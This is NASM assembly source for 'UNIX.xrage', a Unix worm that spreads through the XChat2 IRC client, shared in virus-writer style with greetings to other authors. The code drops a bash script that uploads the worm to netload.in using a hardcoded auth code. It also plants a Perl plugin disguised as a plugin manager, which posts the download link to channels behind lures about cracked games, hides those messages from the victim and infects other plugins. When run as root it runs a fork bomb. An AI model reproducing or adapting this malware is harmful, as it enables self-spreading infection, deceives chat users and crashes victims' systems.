; UNIX.xrage 64bit Xchat2 worm
;
; This is my first creation in nASM which uses still some dirty hacks
; but with time there comes more skill ;)
;
; UNIX.xrage checks if xchat2 and curl is installed. Then it drops a
; Bash script which uploads the worm to netload.in
; Now a Perl Plugin is droped to the autoload directory of xchat2. This
; Plugin now sends every 5 Minutes a random Message with the netload.in
; link to the channel. The victim can't see that he is spreading links
; because the plugin uses some Xchat2 API Foo :D
; The Plugin checks for other perl plugins in the autoload directory and
; infects them.
;
; If the virus is executed as root, the payload is an oldschool forkbomb
;
; You should rly check out the Xchat2 API. It's a heaven for VX :D
;
;
; Greetings to: SPTH, WarGame, alcopaul,herm1t, zer0p, R3s1stanc3, skier
; Greetings to: All the dudes from #virus and #vxnet <3
;
;
; Coded by Perforin [vxnetw0rk]
; "Translated" by R3s1stanc3 [vxnetw0rk]

section .data

%defstr home %!HOME                                 ; $ENV{'HOME'}
%defstr home_env HOME=%!HOME                        ; HOME=$ENV{'HOME'}

HOME:            db home,0                          ; Store $ENV{'HOME'}
HOME_ENV:        db home_env,0                      ; Store HOME=$ENV{'HOME'}

shell:           db "/bin/sh",0                     ; our path the the shell
argv:            dd shell, script2name, 0           ; argument array for sys_execv
endv:            dd HOME_ENV,0                      ; environment array for sys_execv

xchat:           db "/usr/bin/xchat",0              ; path to xchat
curl:            db "/usr/bin/curl",0               ; path to curl

; This is the bash script which will upload the virus to netload.in

script:          db '#!/bin/sh',10,'AUTHCODE="jJk7pHDhVKIF2gZ6tRZ8VCpaTWCWaTra"',10
                 db 'SERVER=`curl -s http://api.netload.in/getserver.php`',10
                 db 'if [ "x$SERVER" = "x" ]; then',10,'exit 3',10,'fi',10
                 db 'PARAMETERS="-F auth=$AUTHCODE -F modus=file_upload"',10
                 db 'PARAMETERS="$PARAMETERS -F file_link=@$1"',10
                 db 'RESULT=`curl -s $PARAMETERS $SERVER`',10
                 db 'RESULT_CODE=`echo "$RESULT"|awk -F ',"';' '{print $1}'`",10
                 db 'RESULT_URL=`echo "$RESULT"|awk -F ',"';' '{print $4}'`",10
                 db 'if [ "x$RESULT_CODE" = "xprepare_failed" ]; then',10,'exit 6',10
                 db 'fi',10,'if [ "x$RESULT_CODE" = "xUPLOAD_OK" ]; then',10
                 db 'echo $RESULT_URL > $HOME/.xchat2/scrollback/url.txt',10,'fi',10
                 db 'exit 100',10
scriptLEN:       equ $-script                       ; length of the script
scriptname:      db 'netload.sh',0                  ; captn obvious here

; This is the dirty-work-script. Copys the virus to its destination and destroys itself

script2:         db '#!/bin/sh',10,"cp UNIX.xrage $HOME/.xchat2/scrollback/UNIX.xrage",10
                 db 'rm hackaround_UNIX.xrage.sh',10
script2LEN:      equ $-script2                          ; length of the script
script2name:     db 'hackaround_UNIX.xrage.sh',0        ; captn obvious strikes again!

; This is the actual Xchat2 Perl Plugin which does the spreading

plugin:          db '#!/usr/bin/perl',10,"$version = '0.1';",10
                 db 'Xchat::register("Xchat2 plugin manager", $version,"Responsible for',
                 db ' loading and initialising Xchat2 plugins");',10
                 db "$xchatdir_vir = Xchat::get_info('xchatdir');",10
                 db '$exec_vir = `sh $xchatdir_vir/scrollback/netload.sh $xchatdir_vir/scrollback/UNIX.xrage &`;',10
                 db '@sentences_vir = ("Hey look at this new cracked minecraft server!",',10
                 db ' "Newest AIMbot for counterstrike is out now! :D", "This tool is amazing!", "Ok I am honest.',10
                 db ' I got infected with UNIX.xrage by Perforin [vxnetw0rk]");',10,10
                 db "Xchat::hook_print('Your Message',\&hideme);",10,"Xchat::hook_timer(300000, \&spread);",10,10
                 db 'sub hideme {',10,'$msg = $_[0][1];',10,'return Xchat::EAT_XCHAT if $msg =~ /netload.in/i;',10,'}',10
                 db 'sub spread {',10,'open url, "<", "$xchatdir_vir/scrollback/url.txt" || die "Please reload Xchat!";',10
                 db 'chomp ($payload_url = <url>);',10,'close url;',10,'$randomize_payload = $sentences_vir[int(rand(4))];',10
                 db 'Xchat::command("say $randomize_payload $payload_url");',10,'}',10,10
                 db '@modules_av = glob "$xchatdir_vir/*.pl";',10,'foreach $module_av (@modules_av) {',10
                 db 'open mod,"<", $module_av;',10,'while (<mod>) {',10,'$infected = 1 and next if $_ =~ /^\# UNIX.xrage$/;',10
                 db '}',10,'push @not_infected, $module_av unless $infected;',10,'undef $infected;',10,'close mod;',10,'}',10
                 db 'foreach $not_infected_yet (@not_infected) {',10,'open mod, ">>", $not_infected_yet;',10
                 db "print mod 'Xchat::command(",'"load ',"' . $xchatdir_vir . '/xchat_PM.pl",'");',"';",10
                 db 'print mod "\# UNIX.xrage\n";',10,'close mod;',10,'}',10,'# UNIX.xrage',10

pluginLEN:       equ $-plugin                           ; length of the script
pluginname:      db 'xchat_PM.pl',0                     ; some lame SE here PM stands for "Plugin Manager"

newname:         db 'UNIX.xrage',0                      ; part of the payload is that virus renames itself

root_payload:    db "Forkbomb bitches! :)",10           ; Those who are dumb enough to start the virus as root
root_payloadLEN: equ $-root_payload                     ; will see this string

xchat_path:      db '.xchat2/scrollback/',0             ; This is the directory which will store our virus
oneless:         db '../',0                             ; --> cd ..

section .text

global _start

_start:

mov rax, 2			; sys_open
mov rdi, xchat			; opening xchat
mov rsi, 0			; O_RDONLY
syscall				;

test rax, rax			; test if xchat exits
je Exit				; no? -> Exit

mov rax, 2			; sys_open
mov rdi, curl			; opening curl
mov rsi, 0			; O_RDONLY
syscall				;

test rax, rax			; test if curl exits
js Exit				; no? -> Exit

payload:

  mov rax, 82			; sys_rename
  mov rdi, [rsp+8]		; get the filename of the stack!
  mov rsi, newname
  syscall

  mov rax, 85			; sys_creat
  mov rdi, script2name		; drops script2
  mov rsi, 00755Q		; -rwxr-xr-x in octal
  syscall			; File descriptor in eax

  test rax, rax			; Is the file descriptor valid?
  js Exit			; No? Something went wrong!

  mov rdi, rax			; move descriptor to rdi
  mov rax, 1			; sys_write
  mov rsi, script2		; content of script2
  mov rdx, script2LEN		; length of script2
  syscall

  mov rax, 102			; sys_getuid
  syscall

  cmp rax, 0			; compare with 0 (0 == root)

  je GotRoot			; jmp if rax is equal to 0
  ja NotRoot			; jmp if rax is above 0


GotRoot:

  mov rax, 1			; sys_write
  mov rdi, 1			; stdout
  mov rsi, root_payload		; payload message
  mov rdx, root_payloadLEN
  syscall

  mov rax, 57			; sys_fork
  syscall			; 
  jmp GotRoot			; loop


NotRoot:

  mov rax, 57			; sys_fork
  syscall

  test rax, rax
  jz Execute			; child executes script

  mov rax, 80			; sys_chdir
  mov rdi, HOME
  syscall

  mov rax, 80			; sys_chdir
  mov rdi, xchat_path
  syscall

  mov rax, 85			; sys_creat
  mov rdi, scriptname		; drops script2
  mov rsi, 00644Q		; -rw-r--r-- in octal
  syscall			; File descriptor in eax

  test rax, rax			; checking file descriptor...
  js Exit			; something went wrong!

  mov rdi, rax
  mov rax, 1			; sys_write
  mov rsi, script2		; script content
  mov rdx, script2LEN		; length of the script content
  syscall

  mov rax, 80			; sys_chdir
  mov rdi, oneless		; cd ../
  syscall

  mov rax, 85			; sys_creat
  mov rdi, pluginname
  mov rsi, 00644Q		; -rw-r--r-- in octal
  syscall

  test rax, rax			; checking file descriptor...
  js Exit			; something went wrong!

  mov rdi, rax
  mov rax, 1			; sys_write
  mov rsi, script2		; the actual xchat plugin drops now
  mov rdx, script2LEN
  syscall

  jmp Exit


Execute:

  mov rax, 59			; sys_execv
  mov rdi, shell
  mov rsi, argv			; execute dirty-work-script
  mov rdx, endv
  syscall


Exit: 
  mov rax, 60			; sys_exit
  mov rdi, 0			; return 0
  syscall			;
